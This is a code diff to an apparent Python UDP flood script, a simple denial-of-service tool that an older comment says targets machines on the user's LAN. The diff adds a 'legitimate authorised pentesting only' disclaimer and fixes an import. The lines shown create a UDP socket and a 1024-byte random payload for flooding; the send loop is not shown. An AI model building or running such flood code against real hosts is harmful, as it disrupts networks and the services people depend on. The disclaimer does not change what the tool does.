@@ -1,9 +1,16 @@
-#a simple script to flood udp req on the machine connected in your LAN :)
+#  Edited to work in Python @sz
+#  To be used for legitimate, authorised pentesting only.
+#  DISCLAIMER: ANY MALICIOUS USE OF THE CONTENTS FROM THIS ARTICLE
+#  WILL NOT HOLD THE AUTHOR & OR UPLOADER RESPONSIBLE, THE CONTENTS ARE SOLELY FOR
+#  EDUCTIONAL PURPOSE & LEGITIMATE AUTHORISED PENTESTING.
+
+
 import socket
 import random
 sent=0
 
-from Tools.scripts.treesync import raw_input
+from six.moves import input as raw_input
+
 
 sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 bytes=random._urandom(1024)
